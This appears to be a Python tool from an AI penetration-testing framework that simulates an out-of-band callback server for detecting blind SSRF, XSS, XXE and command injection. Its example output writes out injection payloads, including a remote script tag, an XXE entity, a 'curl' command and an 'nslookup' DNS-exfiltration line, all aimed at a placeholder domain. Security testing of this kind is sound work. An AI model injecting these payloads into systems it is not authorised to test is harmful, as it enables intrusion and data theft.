"""Out-of-Band Interaction Server for detecting blind vulnerabilities."""

from __future__ import annotations

import secrets
from datetime import datetime
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


OOBAction = Literal["generate_payload", "check_interaction", "list_payloads", "get_url"]


# In-memory storage for testing (in production, use database)
PAYLOADS: dict[str, dict[str, Any]] = {}
INTERACTIONS: list[dict[str, Any]] = []


def _generate_unique_id() -> str:
    """Generate a unique payload ID."""
    return secrets.token_hex(8)


def _generate_dns_payload(base_domain: str, payload_id: str) -> str:
    """Generate DNS-based OOB payload."""
    return f"{payload_id}.{base_domain}"


def _generate_http_payload(base_url: str, payload_id: str) -> str:
    """Generate HTTP-based OOB payload."""
    return f"{base_url}/{payload_id}"


@register_tool
def oob_server(
    action: OOBAction,
    payload_id: str | None = None,
    base_domain: str = "oob.example.com",
    base_url: str = "https://oob.example.com",
    vulnerability_type: str | None = None,
    context: str | None = None,

    **kwargs: Any,  # Capture unknown parameters
) -> dict[str, Any]:
    """Out-of-Band Interaction Server for blind vulnerability detection.

    Generates unique payloads and tracks interactions to detect blind
    vulnerabilities like SSRF, blind XSS, blind XXE, and blind command injection.

    Args:
        action: The OOB action to perform:
            - generate_payload: Generate unique OOB payload
            - check_interaction: Check if payload received interaction
            - list_payloads: List all active payloads
            - get_url: Get OOB URL for a payload
        payload_id: Unique identifier for payload
        base_domain: Base domain for DNS payloads
        base_url: Base URL for HTTP payloads
        vulnerability_type: Type of vulnerability being tested
        context: Additional context about the test

    Returns:
        OOB payload URLs and interaction status
    """
    try:
        if action == "generate_payload":
            payload_id = _generate_unique_id()

            # Generate various payload types
            dns_payload = _generate_dns_payload(base_domain, payload_id)
            http_payload = _generate_http_payload(base_url, payload_id)

            payload_info = {
                "id": payload_id,
                "dns_payload": dns_payload,
                "http_payload": http_payload,
                "https_payload": http_payload.replace("http://", "https://"),
                "created_at": datetime.now().isoformat(),
                "vulnerability_type": vulnerability_type or "unknown",
                "context": context or "",
                "interactions": 0,
            }

            PAYLOADS[payload_id] = payload_info

            return {
                "payload_id": payload_id,
                "payloads": {
                    "dns": dns_payload,
                    "http": http_payload,
                    "https": http_payload.replace("http://", "https://"),
                },
                "example_usage": {
                    "ssrf": f"url={http_payload}",
                    "blind_xss": f"<script src='{http_payload}/xss.js'></script>",
                    "blind_xxe": f"""<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{http_payload}">]><root>&xxe;</root>""",
                    "command_injection": f"curl {http_payload}",
                    "dns_exfiltration": f"nslookup {dns_payload}",
                },
                "check_url": f"{base_url}/check/{payload_id}",
                "note": "This is a simulation. In production, deploy actual OOB server.",
            }

        if action == "check_interaction":
            if not payload_id:
                return {"error": "payload_id required for check_interaction action"}

            if payload_id not in PAYLOADS:
                return {
                    "payload_id": payload_id,
                    "found": False,
                    "message": "Payload ID not found",
                }

            payload = PAYLOADS[payload_id]

            # In production, check actual server logs/database
            # For simulation, return placeholder
            return {
                "payload_id": payload_id,
                "interactions": payload["interactions"],
                "payload_info": payload,
                "vulnerable": payload["interactions"] > 0,
                "note": "This is a simulation. Deploy actual OOB server to detect real interactions.",
            }

        if action == "list_payloads":
            return {
                "total_payloads": len(PAYLOADS),
                "payloads": list(PAYLOADS.values()),
                "active_payloads": len([p for p in PAYLOADS.values() if p["interactions"] == 0]),
                "triggered_payloads": len([p for p in PAYLOADS.values() if p["interactions"] > 0]),
            }

        if action == "get_url":
            if not payload_id:
                return {"error": "payload_id required for get_url action"}

            if payload_id not in PAYLOADS:
                return {"error": f"Payload ID {payload_id} not found"}

            payload = PAYLOADS[payload_id]
            return {
                "payload_id": payload_id,
                "urls": {
                    "dns": payload["dns_payload"],
                    "http": payload["http_payload"],
                    "https": payload["https_payload"],
                },
                "created_at": payload["created_at"],
            }

        return {"error": f"Unknown action: {action}"}

    except (ValueError, KeyError) as e:
        return {"error": f"OOB server operation failed: {e!s}"}
